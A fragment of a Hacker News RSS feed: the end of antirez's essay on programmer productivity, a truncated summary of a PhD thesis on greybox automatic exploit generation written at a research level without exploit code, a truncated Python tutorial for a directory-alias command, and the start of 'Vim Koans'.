<p>The number of hours spent writing code is irrelevant without looking at the quality of the time. External and internal factors can cause a lack of focus. Internal factors cause procrastination. They can be things like lack of interest in the project at hand (you can’t be good at doing things you do not love), lack of exercise or well-being, and poor or little sleeping. External factors are frequent meetings, work environments without actual offices, coworkers interrupting often, etcetera. It seems natural that trying to improve focus and to reduce interruptions is going to have a significant effect on programming productivity. Sometimes to gain focus, extreme measures are needed. For instance, I only read emails from time to time and do not reply to most of them.</p>
<h2>Design sacrifice</h2>
<p>Often complexity is generated when a non-fundamental goal of a project is accounting for a considerable amount of design complexity. In other cases, there is a design tension between a fundamental feature and a non-fundamental one, and this is making the more important goal very hard to reach.
A designer needs to recognize the parts of a design that are not easy wins or where there is no proportionality between the effort and the advantages. To execute a project maximizing the output, one needs to focus precisely on the aspects that matter, and that they can implement in a reasonable amount of time.
When designing the Disque message broker, I realized that by providing only best-effort ordering for the messages, I could substantially improve all the other aspects of the project: availability, query language, and client interaction, simplicity, and performance.</p>
<h2>Simplicity</h2>
<p>Simplicity is an obvious point that means all and nothing. It is worth to check how we often generate complexity to understand what simplicity is. I believe that the two main drivers of complexity are the unwillingness to perform design sacrifices and the accumulation of errors in the design activity.</p>
<p>If you think of the design process, each time we pursue a wrong path, we get farther and farther from the optimal solution. An initial design error, in the wrong hands, is not corrected with a re-design of the same system. It leads to the design of another complex solution to cope with the initial error. The project, thus, becomes more complex and less efficient at every wrong step.</p>
<p><img src="https://imgur.com/qPJakrY.png" alt="simplicity"></p>
<p>We can achieve simplicity by thinking in terms of small mental “proofs of concept” so that we can explore a large number of simple designs with our minds. This technique allows us to start working from something that looks like the most viable and direct solution. Later, experience and personal design abilities allow us to improve the design and find sensible solutions for the sub-design issues that we need to resolve.</p>
<p>However, each time a complex solution seems to be warranted, it’s essential to think deeply about how to avoid this complexity. Only continue in that direction as the last resort, even considering completely different design alternatives.</p>
<h2>Perfectionism</h2>
<p>Perfectionism comes in two variants: an engineering culture of reaching the best possible measurable performance in a program, and a personality trait. In both instances, I see this as one of the most significant barriers for a programmer to deliver things fast. Perfectionism and fear of external judgment bias us to refine a design only according to psychological or trivially measurable parameters. Instead, we tend to forget things like robustness, simplicity, ability to deliver in time. </p>
<h2>Knowledge</h2>
<p>When dealing with complex tasks, knowledge of data structures, fundamental limits of computation, non-trivial algorithms is going to have an impact on the ability to find a suitable design. It is not necessary to be a super expert in everything. Still, it is essential to be at least aware of a multitude of potential solutions for a problem. For example, it is possible to use algorithms which are very efficient at counting unique items in a stream, if we can accept some error percentage. Not everyone is familiar with them.</p>
<h2>Low-level understanding of the machine</h2>
<p>Many issues in programs, even when using high-level languages, arise from the misunderstanding of how the computer is going to perform a given task. Sometimes, this may lead to re-designing and re-implementing a tool from scratch because there is a fundamental problem in the tools or algorithms used. High competence in C, understanding of how CPUs work, and knowledge of how the kernel and system calls are implemented, can be essential in preventing bad, late-stage surprises.</p>
<h2>Debugging skills</h2>
<p>It is surprisingly easy to spend an enormous amount of effort to find bugs. Being able to focus on a bug incrementally and to fix it with a rational set of steps, together with having to deal with simple code that is unlikely to contain too many bugs, can have a significant effect on the programmer's efficiency.</p>
<p>In conclusion, it is not surprising to me to see how the above qualities of a programmer can have a 10x impact on the output. Combined, they allow for proper implementations of designs that start from a viable model and can be several times simpler than alternatives. There is a way to stress simplicity that I like to call “opportunistic programming.” Basically, at every development step, the set of features to implement is chosen to have the maximum impact on the user base of the program, with the minimum requirement of efforts.</p>
<p>
At <a href="https://intelligenthack.com/en" alt="Intelligent Hack" title="Intelligent Hack">Intelligent Hack</a> we are expert in affecting cultural change in development companies that want to modernize their approach to development or improve so they can scale.
We are also able to help you implement agile methodologies, better software architecture, and scaling legacy software so you can concentrate on maximizing growth for your company instead of worrying about how to support it.
Feel free to contact us if you want to have a chat at <a href="https://sklivvz.com/cdn-cgi/l/email-protection" data-cfemail="d7bfbe97beb9a3b2bbbbbeb0b2b9a3bfb6b4bcf9b4b8baf9">[email&nbsp;protected]</a>
</p>
</div></div>]]>
            </description>
            <link>https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez?ref=hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149727</guid>
            <pubDate>Thu, 19 Nov 2020 14:23:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[PhD Thesis: Greybox Automatic Exploit Generation for Heap Overflows]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25149725">thread link</a>) | @azhenley
<br/>
November 19, 2020 | https://sean.heelan.io/2020/11/18/phd-thesis-greybox-automatic-exploit-generation-for-heap-overflows-in-language-interpreters/ | <a href="https://web.archive.org/web/*/https://sean.heelan.io/2020/11/18/phd-thesis-greybox-automatic-exploit-generation-for-heap-overflows-in-language-interpreters/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2528">
		<!-- .entry-header -->

	<div>
					
<p>Over the summer I defended my PhD thesis. You can find it <a rel="noreferrer noopener" href="https://seanhn.files.wordpress.com/2020/11/heelan_phd_thesis.pdf" target="_blank">here</a>. </p>



<p>To give a super quick summary (prior to a rather verbose one ;)):</p>



<ul><li>Pre-2016 exploit generation was primarily focused on single-shot, completely automated exploits for stack-based buffer overflows in things like network daemons and file parsers. In my opinion, the architecture of such systems unlikely to enable exploit generation systems for more complex bug classes, different target software, and in the presence of mitigations. </li><li>Inspired by the success of fuzzing at bug finding, I wanted to bring greybox input generation to bear on exploit generation. As a monolithic problem exploit generation is too complex a task for this to be feasible, so I set about breaking exploit generation down into phases and implementing greybox solutions for each stage. I designed these phases to be composable, and used a template language to enable for communication of solutions between phases.  </li><li>Composable solver solutions and a human-writable template language gives two, new, powerful capabilities for an exploit generation engine: 1) “Human in the loop” means we can automate the things that are currently automatable, while allowing a human to solve the things we don’t have good solvers for, and 2) If solutions are composable, and if a mock solution can be produced for any stage, then we can solve stages out of order. This leads to efficiency gains if a solution to one stage is expensive to produce, but we can mock it out and see if such a solution would even be useful to later stages, and then come back and solve for it if it does turn out to be useful. In practice I leveraged this to assume particular heap layouts, check if an exploit can be created from that point, and only come back and try to achieve that heap layout if it turns out to be exploitable. </li><li>My belief is that the future of exploit generation systems will be architectures in which fuzzing-esque input generation mechanisms are applied to granular tasks within exploit generation, and the solutions to these problems are composed via template languages that allow for human provided solutions as necessary. Symbolic execution will play a limited, but important role, when precise reasoning is required, and other over-approximate static analysis will likely be used to narrow the search problems that both the input generation and symex engines have to consider. </li><li>You’ll find a detailed description of the assumptions I’ve made in Chapter 1, as well as an outline of some of the most interesting future work, in my opinion, in the final chapter. </li></ul>



<p><strong>Background</strong></p>



<p>I originally worked on exploit generation in 2009 (MSc thesis <a rel="noreferrer noopener" href="https://seanhn.files.wordpress.com/2017/12/thesis-heelan.pdf" target="_blank">here</a>), and the approach I developed was to use concolic execution to build SMT formulas representing path semantics for inputs that cause the program to crash, then conjoin these formulas with a logical condition expressing what a successful exploit would look like, and ask an SMT solver to figure out what inputs are required to produce the desired output. This works in some scenarios where there are limited protection mechanisms (IoT junk, for example), but has a number of limitations that prevent it from being a reasonable path to real-world automatic exploit generation (AEG) solutions. There’s the ever present issue with concolic execution that scaling it up to something like a web browser is a bit of an open problem, but the killer flaw is more conceptual, and it is worth explaining as it is the same flaw found at the heart of every exploit generation system I am aware of, right up to and including everything that participated in the DARPA Cyber Grand Challenge. </p>



<p>This earlier work (mine and others) essentially treats exploit generation as a two phase process. Firstly, they find a path to a location considered to be exploitable using a normal fuzzer or symbolic execution tool. ‘Exploitable’ almost always translates to ‘return address on the stack overwritten’ in this case, and this input is then passed to a second stage to convert it to an exploit. That second stage consists of rewriting the bytes in the original input that corrupt a function pointer or return address, and potentially also rewriting some other bytes to provide a payload that will execute a shell, or something similar. This rewriting is usually done by querying an SMT solver. </p>



<p>The conceptual flaw in this approach is the idea that a crashing input as discovered by a fuzzer will, in one step, be transformable into a functioning exploit. In reality, a crashing input from a fuzzer is usually just the starting point of a journey to produce an exploit, and more often than not the initial input leading to that crash is largely discarded once the bug has been manually triaged. The exploit developer will then begin to use it as part of a larger exploit that may involve multiple stages, and leverage the bug as one component piece. </p>



<p><strong>Open Problems Circa 2016</strong></p>



<p>From 2009 to 2016 I worked on other things, but in 2016 I decided to return to academia to do a PhD and picked up the topic again. Reviewing the systems that had participated in the DARPA CGC [3], as well as prior work, there were a few apparent interesting open problems and opportunities:</p>



<ol><li>All systems I found were focused on entirely automated exploit generation, with no capacity for tandem exploit generation with a human in the loop.  </li><li>No research I could find had yet to pick up on the notion of an ‘exploitation primitive’, which is fundamental in the manual construction of exploits, and will presumably be fundamental in any automated, or semi-automated approach. </li><li>All systems treated AEG as essentially a two step process of 1) Find a path that triggers a bug, 2) Transform that path into an exploit in one shot, rather than a multi-stage ‘programming’ problem [4]. IMO, this is the primary limitation of these systems, as mentioned above, and the reason they are not extendable to more realistic scenarios. </li><li>Nobody was really leveraging greybox input generation approaches (fuzzing) extensively, outside of the task of bug finding.</li><li>Almost all systems were still focused on stack-based overflows.</li><li>Nobody was working on integrating information leaks, or dealing with ASLR, in their exploit generation systems. </li><li>Nobody was working on language interpreters/browsers.</li><li>Nobody was working on kernels.</li></ol>



<p>It’s likely that points 5-8 are the ‘reason’ for points 1-4. Once you decide to start tackling any of 5-8, by necessity, you must start thinking about multi-stage exploit generation, having human assistance, addressing bug classes other than stack-based overflows, and using greybox approaches in order to avoid the scalability traps in symbolic execution. </p>



<p><strong>Research</strong></p>



<p>With the above in mind (I didn’t touch 6 or 8), the primary goal for my PhD was to see if I could explore and validate some ideas that I think will push forward the state of the art, and form the foundation of AEG tools in the future. Those ideas are:</p>



<ol><li>Real exploits are often relatively complex programs, with multiple distinct phases in which different tasks must be solved. Much like with ‘normal’ program synthesis, it is likely that different tasks will require different solvers. Also, by breaking the problem down we naturally make it easier to solve as long as solutions to distinct phases are composable. Thus, <strong>my first goal was to break the exploitation process down into distinct phases, with the intention of implementing different solvers for each</strong>. An interesting side effect of breaking the exploit generation task down into multiple, distinct, phases was it allowed me to integrate the idea of <strong>‘lazy’ resolution of these phases</strong>, and solve them out of order. In practice, what this meant was that if a solver for an early stage was much more expensive than a later stage then my system allowed one to ‘mock’ out a solution to the early stage, and only come back to solve it for real once it was validated that having a solution for it would actually lead to an exploit. </li><li>Once exploit generation is broken down into multiple phases, we have decisions to make about how to solve each. Symbolic execution has powered the core of most exploit generation engines, but it has terrible performance characteristics. OTOH fuzzing has proven itself to be vastly more scalable and applicable to a larger set of programs. Why hadn’t fuzzing previously taken off as a primary component of of exploit generation? Well, if you treat exploit generation as a single, monolithic, problem then the state space is simply too large and there’s no reasonable feedback mechanism to navigate it. Greybox approaches that do input generation using mutation really need some sort of gradient to scale and a scoring mechanism to tell them how they are doing. Once we have broken the problem down into phases it becomes much easier to design feedback mechanisms for each stage, and the scale of the state space at each stage is also drastically reduced. <strong>My second goal was therefore to design purely greybox, fuzzing inspired, solutions for each phase of my exploitation pipeline</strong>. I purposefully committed to doing everything greybox to see how far I could push the idea, although in reality you would likely integrate an SMT solver for a few surgical tasks. </li><li>I knew it would be unlikely I’d hit upon the best solver for each pipeline stage at a first attempt, and it’s even possible that a real solution for a particular pipeline stage might be an entire PhD’s worth of research in itself. Thus it is important to enable one to swap out a particular automated solution for either a human provided solution, or an alternate solver. <strong>My third goal was then to figure out a way to enable multiple solvers to interact, be swappable, and to allow for a human in the loop</strong>. To enable this I designed a template approach whereby each stage, and a human exploit developer, could write and update exploits in a template language that further stages could understand and process. I wrote about what …</li></ol></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sean.heelan.io/2020/11/18/phd-thesis-greybox-automatic-exploit-generation-for-heap-overflows-in-language-interpreters/">https://sean.heelan.io/2020/11/18/phd-thesis-greybox-automatic-exploit-generation-for-heap-overflows-in-language-interpreters/</a></em></p>]]>
            </description>
            <link>https://sean.heelan.io/2020/11/18/phd-thesis-greybox-automatic-exploit-generation-for-heap-overflows-in-language-interpreters/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149725</guid>
            <pubDate>Thu, 19 Nov 2020 14:23:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Goto, a command line directory bookmark app]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25149721">thread link</a>) | @ckotsis
<br/>
November 19, 2020 | https://blog.primef.org/posts/2020-11-16/directory-aliases/ | <a href="https://web.archive.org/web/*/https://blog.primef.org/posts/2020-11-16/directory-aliases/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
  <article>
    

    <main>
      <div>
        <p>The full code is available as a link in the end</p>
<h2 id="intro">Intro</h2>
<p>In this post I would like to show you how to build a simple app that manages directories with aliases.</p>
<p>What I mean by that? An app that will do the following</p>
<ul>
<li>Set aliases on a given directory</li>
<li>Navigate to that directory by calling the alias name</li>
<li>Delete or update aliases</li>
<li>Set workdir as a central goto point</li>
<li>Set bash autocompletion for our fun app</li>
</ul>
<p>When this is done you we will be able to set aliases like this</p>
<div><pre><code data-lang="bash">
<span>[</span>user@hostname<span>]</span>$ cd /some/pathA
<span>[</span>user@hostname pathA<span>]</span>$ goto set aliasNameA
<span>[</span>user@hostname pathA<span>]</span>$ cd /some/other/path
<span>[</span>user@hostname pathB<span>]</span>$ goto set aliasNameB
<span>[</span>user@hostname pathB<span>]</span>$ goto aliasNameA
<span>[</span>user@hostname pathA<span>]</span>$ 

</code></pre></div><p>Also we will be able to set a workdir that we can use as a relative point of movement</p>
<div><pre><code data-lang="bash">
<span>[</span>user@hostname<span>]</span>$ ls /some/path
dirA dirB dirC someFile ...
<span>[</span>user@hostname<span>]</span>$ goto set-pdir /some/path
<span>[</span>user@hostname<span>]</span>$ goto dirA
<span>[</span>user@hostname dirA<span>]</span>$ goto dirB
<span>[</span>user@hostname dirB<span>]</span>$  

</code></pre></div><p>We will implement this in two sections.</p>
<ul>
<li>Build the core app that will manage our aliases state</li>
<li>Create a bash script that will use the core app</li>
</ul>
<p>I am using python since it is faster to develop with and it is a standard tool used by linux engineers, and hence
python as a dependency is not an issue (for the majority of cases at least)</p>
<h2 id="core-app-for-working-with-our-state">Core App for working with our state</h2>
<p>The state app will be responsible for the following</p>
<ul>
<li>Write/Read/Update/Delete aliases to disk</li>
<li>Export aliase information back to the caller</li>
<li>List aliases</li>
</ul>
<p>First create <strong>goto</strong> directory</p>
<p>Let us create a file called <strong>state.py</strong> and start with our main class <strong>GotoState</strong></p>
<div><pre><code data-lang="python">
<span>#!/usr/bin/env python3</span>

<span>from</span> os <span>import</span> path

<span>class</span> <span>GotoState</span>(LoadConfig):
    <span>def</span> __init__(self):
        self<span>.</span>rootDir <span>=</span> path<span>.</span>dirname(path<span>.</span>abspath(__file__))
        self<span>.</span>stateEnvFile <span>=</span> self<span>.</span>rootDir <span>+</span> <span>'/.aliases.yml'</span>

<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()

</code></pre></div><p>Inside <strong>init</strong> we are exporting the <strong>rootDir</strong> with value the absolute path to the goto workdir.
The reason we did that is because we want <strong>stateEnvFile</strong> to be relative to the <strong>state.py</strong> file and not
relative to the invokation’s path.</p>
<p>Next we will add the code for creating and updating the <strong>.aliases.yml</strong> file. But before we do that, let us first
install pyyaml which will be the only dependency for this app (not considering python3, pip and bash)</p>
<p>Create a local directory called modules</p>
<p>Install pyyaml in modules</p>
<div><pre><code data-lang="bash">
pip install --target<span>=</span>modules/ pyyaml

pip3 freeze | grep <span>'PyYAML=='</span> &gt; requirements.txt

cat &gt; setup.sh <span>&lt;&lt;EOF
</span><span>pip install -r requirements.txt --target=modules/ 
</span><span>EOF</span>
</code></pre></div><p>Update <strong>state.py</strong> with the following code</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 0
</span><span> 1
</span><span><span> 2
</span></span><span><span> 3
</span></span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span><span>22
</span><span>23
</span><span>24
</span><span>25
</span><span>26
</span><span>27
</span><span>28
</span><span>29
</span><span>30
</span><span>31
</span><span>32
</span><span>33
</span><span>34
</span><span>35
</span><span>36
</span><span>37
</span><span>38
</span><span>39
</span><span>40
</span><span>41
</span><span>42
</span><span>43
</span><span>44
</span><span>45
</span></code></pre></td>
<td>
<pre><code data-lang="python"><span>#!/usr/bin/env python3</span>

<span><span>from</span> sys <span>import</span> path <span>as</span> syspath
</span><span>syspath<span>.</span>insert(<span>0</span>, <span>'modules'</span>)
</span>
<span>from</span> sys <span>import</span> argv, stdout
<span>from</span> os <span>import</span> path
<span>import</span> yaml


<span>class</span> <span>LoadConfig</span>():
    <span>def</span> <span>read_conf</span>(self, docFile):
        stateFile <span>=</span> docFile
        <span>with</span> open(stateFile, <span>'r'</span>) <span>as</span> _STREAM:
            <span>try</span>:
                _CFG <span>=</span> yaml<span>.</span>safe_load(_STREAM)
            <span>except</span> yaml<span>.</span>YAMLError <span>as</span> _EXC:
                <span>raise</span>

        <span>return</span> _CFG

    <span>def</span> <span>update_conf</span>(self, docFile, docCont):
        stateFile <span>=</span> docFile
        <span>with</span> open(stateFile, <span>'w'</span>) <span>as</span> file:
            yaml<span>.</span>dump(docCont, file)


<span>class</span> <span>GotoState</span>(LoadConfig):
    <span>def</span> __init__(self):
        self<span>.</span>rootDir <span>=</span> path<span>.</span>dirname(path<span>.</span>abspath(__file__))
        self<span>.</span>stateEnvFile <span>=</span> self<span>.</span>rootDir <span>+</span> <span>'/.aliases.yml'</span>

        <span>if</span> path<span>.</span>isfile(self<span>.</span>stateEnvFile):
            self<span>.</span>stateEnv <span>=</span> self<span>.</span>read_conf(docFile<span>=</span>self<span>.</span>stateEnvFile)
        <span>else</span>:
            self<span>.</span>stateEnv <span>=</span> {
                <span>'aliases'</span>: {},
                <span>'workdir'</span>: self<span>.</span>rootDir,
            }
            self<span>.</span>update_conf(
                docFile<span>=</span>self<span>.</span>stateEnvFile,
                docCont<span>=</span>self<span>.</span>stateEnv
            )

<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()</code></pre></td></tr></tbody></table>
</div>
</div>
<ul>
<li>Note on lines (2 - 3) we are pushing to syspath.index 0 our local modules</li>
<li>On lines (11 - 25) we define the classfunction that will read and update our state file</li>
<li>On lines (33 - 43) we simply check if the file exists, in cases it does not we create it and populate it with a directory</li>
</ul>
<p>Now that we have the code to create and update our state file we can add some methods to work with it</p>
<p>First we will add the <strong>add</strong> method for inserting new items in the state file</p>
<p>Append to the <strong>GotoState</strong> class the following code</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 0
</span><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span></code></pre></td>
<td>
<pre><code data-lang="python">    <span>def</span> <span>check_paths</span>(self, p, <span>**</span>kwargs):
        <span>if</span> p<span>.</span>endswith(<span>"/"</span>) <span>and</span> len(p) <span>&gt;</span> <span>1</span>:
            p <span>=</span> p[:len(p)<span>-</span><span>1</span>] 
        <span>if</span> kwargs[<span>"opts"</span>]<span>.</span>get(<span>"show"</span>, False):
            <span>print</span>(p)
        <span>else</span>:
            <span>return</span> p

    <span>def</span> <span>add</span>(self, alias, p):
        cpath <span>=</span> self<span>.</span>check_paths(p, opts<span>=</span>{})
        self<span>.</span>stateEnv[<span>"aliases"</span>][alias] <span>=</span> cpath
        self<span>.</span>update_conf(
            docFile<span>=</span>self<span>.</span>stateEnvFile, 
            docCont<span>=</span>self<span>.</span>stateEnv
        )</code></pre></td></tr></tbody></table>
</div>
</div>
<p>Initially we define <strong>check_paths</strong> method which simply trims any trailing / from the path.
The condition is there because the method will also be called from the caller sometimes, therefore we need
to send a result back.</p>
<p>Then we define the <strong>add</strong> method which simple calls <strong>check_paths</strong> and then updates the state file with the gievn path</p>
<p>To test this, first add the following in the <strong><strong>name</strong> == <strong>main</strong></strong> section at the end</p>
<div><pre><code data-lang="python">
<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()
    <span>if</span> argv[<span>1</span>] <span>==</span> <span>"add"</span>:
        gotoState<span>.</span>add(argv[<span>2</span>], argv[<span>3</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check_paths"</span>:
        gotoState<span>.</span>check_paths(argv[<span>2</span>], opts<span>=</span>{<span>"show"</span>: True})

</code></pre></div><p>We could start developing argparse but I think it is too much for this app since</p>
<ul>
<li>it will have few methods</li>
<li>it will only be called from the caller script</li>
</ul>
<p>Let’s test <strong>add</strong></p>
<div><pre><code data-lang="bash">
python state.py add root /

cat .aliases.yml 
aliases:
  root: /
workdir: /home/user/test

</code></pre></div><p>Next we will add the <strong>list_aliases</strong> method</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>0
</span><span>1
</span><span>2
</span></code></pre></td>
<td>
<pre><code data-lang="python">    <span>def</span> <span>list_aliases</span>(self):
        aliases <span>=</span> [<span>"</span><span>%s</span><span>::::</span><span>%s</span><span>"</span> <span>%</span> (x, self<span>.</span>stateEnv[<span>"aliases"</span>][x]) <span>for</span> x <span>in</span> self<span>.</span>stateEnv[<span>"aliases"</span>]]
        <span>print</span>(<span>","</span><span>.</span>join(aliases))</code></pre></td></tr></tbody></table>
</div>
</div>
<p>The reason I decided to join the alias name and its path with <strong>::::</strong> is in order to make the caller able
to split the string and easily derive the name and path. There is no special perpuse for selecting <strong>::::</strong>,
I just did.</p>
<p>Also add the respective if condition under <strong><strong>main</strong></strong></p>
<div><pre><code data-lang="python">
<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()
    <span>if</span> argv[<span>1</span>] <span>==</span> <span>"add"</span>:
        gotoState<span>.</span>add(argv[<span>2</span>], argv[<span>3</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check_paths"</span>:
        gotoState<span>.</span>check_paths(argv[<span>2</span>], opts<span>=</span>{<span>"show"</span>: True})
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"list"</span>:
        gotoState<span>.</span>list_aliases()

</code></pre></div><p>Testing list</p>
<div><pre><code data-lang="bash">
python state.py list
root::::/

</code></pre></div><p>Next we add the <strong>rm</strong> method for removing aliases from the state file</p>
<p>Method Code:</p>
<div><pre><code data-lang="python">

    <span>def</span> <span>rm</span>(self, alias):
        <span>if</span> self<span>.</span>stateEnv[<span>"aliases"</span>]<span>.</span>get(alias):
            self<span>.</span>stateEnv[<span>"aliases"</span>]<span>.</span>pop(alias)
            self<span>.</span>update_conf(
                docFile<span>=</span>self<span>.</span>stateEnvFile, 
                docCont<span>=</span>self<span>.</span>stateEnv
            )
        <span>else</span>:
            <span>print</span>(<span>"Alias: </span><span>%s</span><span> does not exist"</span> <span>%</span> alias)

</code></pre></div><p>Respective <strong><strong>main</strong></strong> argv condition</p>
<div><pre><code data-lang="python">
<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()
    <span>if</span> argv[<span>1</span>] <span>==</span> <span>"add"</span>:
        gotoState<span>.</span>add(argv[<span>2</span>], argv[<span>3</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check_paths"</span>:
        gotoState<span>.</span>check_paths(argv[<span>2</span>], opts<span>=</span>{<span>"show"</span>: True})
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"list"</span>:
        gotoState<span>.</span>list_aliases()
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"rm"</span>:
        gotoState<span>.</span>rm(argv[<span>2</span>])

</code></pre></div><p>Next we add the <strong>check</strong> and <strong>get</strong> methods</p>
<ul>
<li>check: Checks if an alias exists</li>
<li>get: returns back to the caller the alias path</li>
</ul>
<p>Methods Code:</p>
<div><pre><code data-lang="python">
    <span>def</span> <span>get</span>(self, alias):
        <span>print</span>(self<span>.</span>stateEnv[<span>"aliases"</span>]<span>.</span>get(alias, None))

    <span>def</span> <span>check</span>(self, alias):
        get_alias <span>=</span> self<span>.</span>stateEnv[<span>"aliases"</span>]<span>.</span>get(alias, None)
        <span>if</span> get_alias:
            <span>print</span>(<span>"</span><span>%s</span><span>::::</span><span>%s</span><span>"</span> <span>%</span> (True, get_alias))
        <span>else</span>:
            <span>print</span>(<span>"</span><span>%s</span><span>::::</span><span>%s</span><span>"</span> <span>%</span> (False, get_alias))


</code></pre></div><p>Here again I am adding <strong>::::</strong> as a separator for the caller</p>
<p>Respective <strong><strong>main</strong></strong> argv condition</p>
<div><pre><code data-lang="python">
<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()
    <span>if</span> argv[<span>1</span>] <span>==</span> <span>"add"</span>:
        gotoState<span>.</span>add(argv[<span>2</span>], argv[<span>3</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check_paths"</span>:
        gotoState<span>.</span>check_paths(argv[<span>2</span>], opts<span>=</span>{<span>"show"</span>: True})
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"list"</span>:
        gotoState<span>.</span>list_aliases()
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"rm"</span>:
        gotoState<span>.</span>rm(argv[<span>2</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"get"</span>:
        gotoState<span>.</span>get(argv[<span>2</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check"</span>:
        gotoState<span>.</span>check(argv[<span>2</span>])

</code></pre></div><p>Testing <strong>rm check and get</strong></p>
<div><pre><code data-lang="bash">
python3 state.py check root
True::::/

python3 state.py get root
/

python3 state.py rm root
python state.py list

</code></pre></div><p>Finally we will add the last two methods <strong>set_workdir</strong> and <strong>get_workdir</strong>. At the begining we claimed that we will be able
to set a project dir and navigate through its directories freely.</p>
<p>Methods Code:</p>
<div><pre><code data-lang="python">
    <span>def</span> <span>set_workdir</span>(self, path):
        cpath <span>=</span> self<span>.</span>check_paths(path, opts<span>=</span>{})
        self<span>.</span>stateEnv[<span>"workdir"</span>] <span>=</span> cpath
        self<span>.</span>update_conf(
            docFile<span>=</span>self<span>.</span>stateEnvFile,
            docCont<span>=</span>self<span>.</span>stateEnv
        )

    <span>def</span> <span>get_workdir</span>(self):
        workdir <span>=</span> self<span>.</span>stateEnv<span>.</span>get(<span>"workdir"</span>, None)
        <span>if</span> workdir <span>==</span> None:
            self<span>.</span>set_workdir(self<span>.</span>rootDir)
            <span>print</span>(self<span>.</span>rootDir)
        <span>else</span>:
            <span>print</span>(workdir)

</code></pre></div><p>Respective <strong><strong>main</strong></strong> argv condition</p>
<div><pre><code data-lang="python">
<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()
    <span>if</span> argv[<span>1</span>] <span>==</span> <span>"add"</span>:
        gotoState<span>.</span>add(argv[<span>2</span>], argv[<span>3</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check_paths"</span>:
        gotoState<span>.</span>check_paths(argv[<span>2</span>], opts<span>=</span>{<span>"show"</span>: True})
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"list"</span>:
        gotoState<span>.</span>list_aliases()
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"rm"</span>:
        gotoState<span>.</span>rm(argv[<span>2</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"get"</span>:
        gotoState<span>.</span>get(argv[<span>2</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check"</span>:
        gotoState<span>.</span>check(argv[<span>2</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"set_workdir"</span>:
        gotoState<span>.</span>set_workdir(argv[<span>2</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"get_workdir"</span>:
        gotoState<span>.</span>get_workdir()

</code></pre></div><p>We will not test these for now because they do not have a value right now without the caller script.
For convenience the whole code of <strong>state.py</strong> is here <a href="https://github.com/ulfox/goto/blob/main/state.py">State.py Code</a></p>
<p>We next move to the caller script</p>
<h2 id="the-goto-script">The Goto …</h2></div></main></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.primef.org/posts/2020-11-16/directory-aliases/">https://blog.primef.org/posts/2020-11-16/directory-aliases/</a></em></p>]]>
            </description>
            <link>https://blog.primef.org/posts/2020-11-16/directory-aliases/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149721</guid>
            <pubDate>Thu, 19 Nov 2020 14:23:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vim Koans]]>
            </title>
            <description>
<![CDATA[
Score 56 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25149640">thread link</a>) | @manjana
<br/>
November 19, 2020 | https://sanctum.geek.nz/arabesque/vim-koans/ | <a href="https://web.archive.org/web/*/https://sanctum.geek.nz/arabesque/vim-koans/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><em>These koans have been independently translated into <a href="https://web-beta.archive.org/web/20160313124308/http://ranmocy.me/translation/vim-koans/">Chinese</a>,
thanks to Wanzhang Sheng, and into <a href="http://silly-bytes.blogspot.com/2016/05/vim-koans-espanol.html">Spanish</a>, thanks to Daniel Campoverde Carrión.</em></p>

